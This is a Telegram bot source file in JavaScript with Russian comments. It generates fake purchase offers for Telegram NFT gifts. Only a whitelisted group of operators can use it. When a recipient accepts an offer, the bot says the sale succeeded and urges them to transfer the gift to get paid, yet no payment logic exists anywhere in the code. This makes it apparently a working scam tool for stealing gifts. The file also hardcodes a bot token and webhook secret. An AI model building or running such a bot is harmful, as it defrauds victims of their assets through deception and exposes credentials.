const ADMIN_ID = 5151757168; 
const BOT_TOKEN = "9231998177:AAGBygPUUaRla7FJujix4bE9cpYWcg4U3w0"; // ВСТАВЬ СВОЙ ТОКЕН
const WEBHOOK_SECRET = "GarisOffer9231998"; // ТВОЙ СЕКРЕТ

// ТУТ ВСЕ ТВОИ ID (включая новый)
const ALLOWED_IDS = [
  5151757168, 
  9021098137, 
  1290278554, 
  883619484,
  7903610791
];
const ALLOWED_USERNAMES = ["nogannopervi"];

export default {
  async fetch(request, env, ctx) {
    const secretHeader = request.headers.get("X-Telegram-Bot-Api-Secret-Token");
    if (secretHeader !== WEBHOOK_SECRET) {
      return new Response("Forbidden", { status: 403 });
    }

    if (request.method !== "POST") return new Response("OK", { status: 200 });

    try {
      const update = await request.json();

      // --- /start ---
      if (update.message && update.message.text === "/start") {
        const chatId = update.message.chat.id;
        const userId = update.message.from.id;
        const username = update.message.from.username ? update.message.from.username.toLowerCase() : "";

        const isAdmin = userId === ADMIN_ID;
        const isAllowed = ALLOWED_IDS.includes(userId) || (username && ALLOWED_USERNAMES.includes(username));
        
        let text = "";
        if (!isAdmin && !isAllowed) {
          text = `🔒 <b>Доступ закрыт.</b>\n\nОбратитесь к владельцу: @gwrex\nВаш ID: <code>${userId}</code>`;
        } else {
          text = `🎁 <b>NFT OFFER BOT</b> ||\n\n✅ <b>Пользователь · Gift</b>\n🆔 <b>Ваш ID:</b> <code>${userId}</code>\n👑 <b>Владелец:</b> @gwrex\n\nОтправь оффер в Stars:\n<code>@GarisOfferBot t.me/nft/LolPop-348029 450 stars</code>\n\nОтправь оффер в Gram:\n<code>@GarisOfferBot t.me/nft/PrettyPosy-5375 500 gram</code>`;
        }
        await callApi("sendMessage", { chat_id: chatId, text: text, parse_mode: "HTML" });
      }

      // --- INLINE (Создание офера) ---
      if (update.inline_query) {
        const iq = update.inline_query;
        const userId = iq.from.id;
        const username = iq.from.username ? iq.from.username.toLowerCase() : "";
        
        const isAdmin = userId === ADMIN_ID;
        const isAllowed = ALLOWED_IDS.includes(userId) || (username && ALLOWED_USERNAMES.includes(username));

        if (!isAdmin && !isAllowed) return new Response("OK", { status: 200 });

        // Очистка от скрытых символов (защита от iPhone)
        let textQuery = iq.query.replace(/[\u00A0\u200B\u202F]/g, ' ').replace(/https?:\/\//gi, '').trim().toLowerCase(); 
        
        // Ищем сумму
        const allNums = textQuery.match(/\d+/g); 
        const amount = allNums ? allNums[allNums.length - 1] : "0"; 
        
        // Ищем ссылку/название подарка
        const giftMatch = textQuery.match(/(?:https?:\/\/)?(?:t\.me\/nft\/)?[A-Za-z0-9_-]+/i); 
        let giftLink = "";
        if (giftMatch) {
            let rawGift = giftMatch[0].replace(/^https?:\/\//, '');
            if (rawGift.startsWith("t.me")) {
                giftLink = "https://" + rawGift;
            } else {
                giftLink = "https://t.me/nft/" + rawGift;
            }
        }

        // ОПРЕДЕЛЯЕМ ВАЛЮТУ (по умолчанию Stars)
        let currency = "⭐ Stars";
        if (textQuery.includes("gram") || textQuery.includes("ton")) {
            currency = "💎 Gram";
        }

        let senderName = iq.from.first_name || "";
        if (iq.from.last_name) senderName += " " + iq.from.last_name;
        if (!senderName) senderName = iq.from.username ? "@" + iq.from.username : "Игрок";

        const text = `🎁 <b>Оффер на подарок</b>\n\n👤 <b>${senderName}</b> предлагает вам ${amount} ${currency} за этот подарок.\n\n${giftLink}\n\n⏳ Предложение действительно 5 ч. 59 мин.`;

        const results = [{
          type: "article",
          id: "1",
          title: `Оффер от ${senderName}`,
          description: `За ${amount} ${currency}`,
          input_message_content: { message_text: text, parse_mode: "HTML" },
          reply_markup: {
            inline_keyboard: [
              [{ text: "✅ Принять", callback_data: "acc" }],
              [{ text: "❌ Отклонить", callback_data: "dec" }]
            ]
          }
        }];

        await callApi("answerInlineQuery", { inline_query_id: iq.id, results: results, cache_time: 0 });
      }

      // --- КНОПКИ ---
      if (update.callback_query) {
        const cq = update.callback_query;
        
        if (cq.data.startsWith("acc") || cq.data.startsWith("dec")) {
            
          const buyer = cq.from;
          let buyerName = buyer.first_name || "";
          if (buyer.last_name) buyerName += " " + buyer.last_name;
          if (!buyerName) buyerName = buyer.username ? "@" + buyer.username : "Пользователь";

          let buyerLink = buyer.username ? "https://t.me/" + buyer.username : "https://t.me/gwrex";

          const messageText = cq.message.text || cq.message.caption || "";
          
          // Вытаскиваем сумму
          const amountMatch = messageText.match(/(\d+)/);
          const amount = amountMatch ? amountMatch[1] : "указанную сумму";

          // ОПРЕДЕЛЯЕМ ВАЛЮТУ ИЗ СООБЩЕНИЯ (Stars или Gram)
          let displayCurrency = "⭐ Stars";
          if (messageText.toLowerCase().includes("gram") || messageText.toLowerCase().includes("ton")) {
            displayCurrency = "💎 Gram";
          }

          let newText = "";
          let newMarkup = { inline_keyboard: [] };

          if (cq.data.startsWith("acc")) {
            await callApi("answerCallbackQuery", { 
              callback_query_id: cq.id, 
              text: `Предложение успешно принято ✅\n\nПередайте подарок, чтобы ${amount} ${displayCurrency} пришли`, 
              show_alert: true 
            });
            
            newText = `✅ <b>Подарок продан!</b>\n\nПередайте его покупателю <b>${buyerName}</b>, чтобы получить ${amount} ${displayCurrency}.`;
            newMarkup = { 
              inline_keyboard: [[{ text: "🎁 Передать подарок", url: buyerLink }]] 
            };
          } else {
            await callApi("answerCallbackQuery", { callback_query_id: cq.id });
            newText = `❌ <b>Вы отказались от оффера.</b>`;
          }

          if (cq.inline_message_id) {
            try {
              if (cq.message && cq.message.caption !== undefined) {
                await callApi("editMessageCaption", { inline_message_id: cq.inline_message_id, caption: newText, parse_mode: "HTML", reply_markup: newMarkup });
              } else {
                await callApi("editMessageText", { inline_message_id: cq.inline_message_id, text: newText, parse_mode: "HTML", reply_markup: newMarkup });
              }
            } catch (err) { console.error("Ошибка при редактировании:", err.message); }
          } 
          else if (cq.message) {
            const chatId = cq.message.chat.id;
            const messageId = cq.message.message_id;
            try {
              await callApi("sendMessage", { chat_id: chatId, text: newText, parse_mode: "HTML", reply_markup: newMarkup });
              try { await callApi("deleteMessage", { chat_id: chatId, message_id: messageId }); } catch (e) {}
            } catch (err) { console.error("Ошибка отправки:", err.message); }
          }
        }
      }

      return new Response("OK", { status: 200 });
    } catch (error) {
      console.error("КРИТИЧЕСКАЯ ОШИБКА:", error.message);
      return new Response("Error: " + error.message, { status: 500 });
    }
  }
};

async function callApi(method, body) {
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/${method}`;
  try {
    const response = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(body)
    });
    const data = await response.json();
    if (!data.ok) throw new Error(data.description);
    return data;
  } catch (e) {
    console.error(`Ошибка API [${method}]:`, e.message);
    throw e;
  }
}